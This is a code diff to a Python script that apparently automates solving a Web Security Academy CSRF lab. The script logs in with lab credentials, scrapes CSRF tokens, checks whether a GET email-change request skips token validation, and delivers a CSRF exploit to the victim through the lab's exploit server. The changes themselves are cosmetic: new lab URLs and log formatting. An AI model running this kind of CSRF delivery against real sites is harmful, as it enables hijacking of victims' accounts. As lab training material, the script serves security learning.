@@ -8,34 +8,32 @@ import inquirer
 from http import HTTPStatus
 
 console = Console()
-EXPLOIT_SERVER="https://exploit-0a3f008a0384e44bc129102a011f005e.exploit-server.net"
-SERVER="https://0a34006f03e8e43fc1861077002b000e.web-security-academy.net"
+EXPLOIT_SERVER="https://exploit-0a7000c2033b6db8c0e883d201e1009b.exploit-server.net"
+SERVER="https://0a55005d039a6d29c06981750089007e.web-security-academy.net"
 
 
 def login(session, server):
     response = session.get(f"{server}/login")
-    console.log(f"GET login status code {response.status_code}")
+    console.log(f"GET login status code {response.status_code}\n")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
-    console.log(f"Login CSRF Token = {csrf_token}")
     response = session.post(f"{server}/login", data={
         "csrf": csrf_token,
         "username": "wiener",
         "password": "peter",
     })
-    console.log(f"POST login status code {response.status_code}")
+    console.log(f"POST login status code {response.status_code}\n")
 
 def update_email(session, server, exploit_server):
     response = session.get(f"{server}/my-account")
-    console.log(f"GET my-account status code {response.status_code}")
+    console.log(f"GET my-account status code {response.status_code}\n")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
-    console.log(f"Account CSRF Token = {csrf_token}")
     response = session.post(f"{server}/my-account/change-email", data={
         "email": "ciccio@paticcio.it",
         "csrf": csrf_token,
     })
-    console.log(f"POST change-email status code {response.status_code}")
+    console.log(f"POST change-email status code {response.status_code}\n")
 
     confirm = {
     inquirer.Confirm('confirmed',
@@ -76,7 +74,7 @@ def get_update_email(session, server, exploit_server):
     response = session.get(f"{server}/my-account/change-email?email={email}&csrf={csrf}")
     
     if response.status_code == HTTPStatus.OK:
-        console.log(f"GET change-email status code {response.status_code}")
+        console.log(f"GET change-email status code {response.status_code}\n")
         confirm = {
             inquirer.Confirm('confirmed',
                      message="The server doesn't consider the csrf parameter, would you like to exploit it?" ,
@@ -86,7 +84,7 @@ def get_update_email(session, server, exploit_server):
         if confirmation['confirmed']==True:
             csrf_exploit(session, server, exploit_server, email, csrf)
     else:
-        console.log(f"GET change-email status code {response.status_code}")
+        console.log(f"GET change-email status code {response.status_code}\n")
 
 
 def csrf_exploit(session, server, exploit_server, email, csrf):
@@ -138,9 +136,10 @@ def csrf_exploit(session, server, exploit_server, email, csrf):
         ''',
         "formAction": "DELIVER_TO_VICTIM",
     })
-    console.log(f"POST DELIVER_TO_VICTIM status code {response.status_code}")
+    console.log(f"POST DELIVER_TO_VICTIM status code {response.status_code}\n")
     if response.status_code == HTTPStatus.OK:
-        console.log("Lab Solved")
+        style = "bold white on green"
+        console.print("Lab Solved", style=style, justify="center")
 
 
 
